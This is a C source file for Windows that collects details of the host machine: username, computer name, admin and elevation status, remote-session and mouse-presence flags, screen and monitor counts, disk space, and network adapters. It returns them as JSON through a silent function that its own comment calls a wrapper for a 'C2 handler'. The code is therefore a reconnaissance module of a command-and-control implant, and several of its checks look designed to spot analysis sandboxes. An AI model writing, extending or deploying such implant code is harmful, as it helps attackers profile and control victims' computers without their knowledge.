#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include <iphlpapi.h>
#include <lmcons.h>     // UNLEN
#include <stdlib.h>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")

// Structure to hold collected system information
typedef struct {
    char username[UNLEN + 1];
    char computername[MAX_COMPUTERNAME_LENGTH + 1];
    int screenWidth;
    int screenHeight;
    int numMonitors;
    BOOL isAdmin;
    BOOL isElevated;
    BOOL isRemoteSession;
    BOOL hasMousePresent;
    int numLogicalDrives;
    ULARGE_INTEGER totalDiskSpace;
    ULARGE_INTEGER freeDiskSpace;
    int numNetworkAdapters;
} SystemInfo;

// Get disk free space for C: drive
ULARGE_INTEGER GetDiskFreeSpace(void) {
    ULARGE_INTEGER freeBytesAvailable = {0};
    GetDiskFreeSpaceExA("C:\\", &freeBytesAvailable, NULL, NULL);
    return freeBytesAvailable;
}

// Get total disk space for C: drive
ULARGE_INTEGER GetTotalDiskSpace(void) {
    ULARGE_INTEGER totalBytes = {0};
    GetDiskFreeSpaceExA("C:\\", NULL, &totalBytes, NULL);
    return totalBytes;
}

// Count logical drives
int CountLogicalDrives(void) {
    DWORD drives = GetLogicalDrives();
    int count = 0;
    for (int i = 0; i < 26; i++) {
        if (drives & (1 << i)) {
            count++;
        }
    }
    return count;
}

// Count network adapters
int CountNetworkAdapters(void) {
    ULONG outBufLen = 0;
    int adapterCount = 0;

    if (GetAdaptersInfo(NULL, &outBufLen) == ERROR_BUFFER_OVERFLOW) {
        PIP_ADAPTER_INFO pAdapterInfo = (PIP_ADAPTER_INFO)malloc(outBufLen);
        if (pAdapterInfo != NULL) {
            if (GetAdaptersInfo(pAdapterInfo, &outBufLen) == NO_ERROR) {
                PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
                while (pAdapter) {
                    adapterCount++;
                    pAdapter = pAdapter->Next;
                }
            }
            free(pAdapterInfo);
        }
    }
    return adapterCount;
}



// Collect system information into a structure
SystemInfo* CollectSystemInfo(void) {
    SystemInfo* info = (SystemInfo*)malloc(sizeof(SystemInfo));
    if (info == NULL) {
        return NULL;
    }

    // Initialize
    memset(info, 0, sizeof(SystemInfo));

    // Get username
    DWORD userSize = UNLEN + 1;
    GetUserNameA(info->username, &userSize);

    // Get computer name
    DWORD compSize = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameA(info->computername, &compSize);

    // Get screen metrics
    info->screenWidth = GetSystemMetrics(SM_CXSCREEN);
    info->screenHeight = GetSystemMetrics(SM_CYSCREEN);
    info->numMonitors = GetSystemMetrics(SM_CMONITORS);
    info->hasMousePresent = GetSystemMetrics(SM_MOUSEPRESENT);

    // Check if remote session
    info->isRemoteSession = GetSystemMetrics(SM_REMOTESESSION);

    // Get disk information
    info->freeDiskSpace = GetDiskFreeSpace();
    info->totalDiskSpace = GetTotalDiskSpace();
    info->numLogicalDrives = CountLogicalDrives();

    // Get network adapter count
    info->numNetworkAdapters = CountNetworkAdapters();

    // Check elevation status
    HANDLE token = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION elevation = {0};
        DWORD retLen = 0;
        if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &retLen)) {
            info->isElevated = elevation.TokenIsElevated;
        }

        BOOL isMember = FALSE;
        PSID adminSid = NULL;
        SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
        if (AllocateAndInitializeSid(&ntAuth, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                     DOMAIN_ALIAS_RID_ADMINS, 0,0,0,0,0,0, &adminSid)) {
            if (CheckTokenMembership(NULL, adminSid, &isMember)) {
                info->isAdmin = isMember;
            }
            FreeSid(adminSid);
        }
        CloseHandle(token);
    }

    return info;
}

// Free system information structure
void FreeSystemInfo(SystemInfo* info) {
    if (info != NULL) {
        free(info);
    }
}

// Start info collector - wrapper function for C2 handler
// Returns system information data (no console output)
char* start_info_collector() {
    // Collect system information
    SystemInfo* info = CollectSystemInfo();
    
    if (info) {
        // Allocate buffer for system info output
        char *result = (char*)malloc(8192);
        if (!result) {
            FreeSystemInfo(info);
            return NULL;
        }
        
        snprintf(result, 8192,
                 "{\n"
                 "  \"username\": \"%s\",\n"
                 "  \"computername\": \"%s\",\n"
                 "  \"screen_width\": %d,\n"
                 "  \"screen_height\": %d,\n"
                 "  \"monitors\": %d,\n"
                 "  \"admin\": %s,\n"
                 "  \"elevated\": %s,\n"
                 "  \"remote_session\": %s,\n"
                 "  \"mouse_present\": %s,\n"
                 "  \"logical_drives\": %d,\n"
                 "  \"free_disk_space_mb\": %llu,\n"
                 "  \"total_disk_space_mb\": %llu,\n"
                 "  \"network_adapters\": %d\n"
                 "}",
                 info->username,
                 info->computername,
                 info->screenWidth, info->screenHeight,
                 info->numMonitors,
                 info->isAdmin ? "true" : "false",
                 info->isElevated ? "true" : "false",
                 info->isRemoteSession ? "true" : "false",
                 info->hasMousePresent ? "true" : "false",
                 info->numLogicalDrives,
                 info->freeDiskSpace.QuadPart / (1024 * 1024),
                 info->totalDiskSpace.QuadPart / (1024 * 1024),
                 info->numNetworkAdapters);
        
        FreeSystemInfo(info);
        return result;
    }
    
    return NULL;
}
